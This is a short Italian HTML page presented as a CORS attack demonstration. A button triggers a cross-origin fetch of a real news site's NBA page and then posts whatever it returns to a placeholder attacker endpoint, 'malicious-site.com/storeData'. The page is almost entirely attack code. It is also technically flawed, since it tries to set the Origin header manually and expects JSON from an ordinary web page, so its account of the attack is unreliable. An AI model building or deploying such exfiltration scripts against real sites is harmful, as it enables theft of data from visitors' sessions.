<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <title>Attacco CORS</title>
</head>
<body>
    <h1>Attacco CORS Dimostrativo</h1>
    <button id="attackBtn">Esegui Attacco</button>

    <script>
        document.getElementById('attackBtn').addEventListener('click', function() {
            fetch("https://sport.sky.it/nba", {
                method: "GET",
                mode: "cors",
                headers: {
                    "Origin": "http://malicious-site.com"
                }
            }).then(response => {
                if (response.ok) {
                    return response.json();
                } else {
                    throw new Error('Network response was not ok');
                }
            }).then(data => {
                console.log("Dati ricevuti:", data);
                fetch("http://malicious-site.com/storeData", {
                    method: "POST",
                    body: JSON.stringify(data),
                    headers: {
                        "Content-Type": "application/json"
                    }
                });
            }).catch(error => console.error("Errore:", error));
        });
    </script>
</body>
</html>
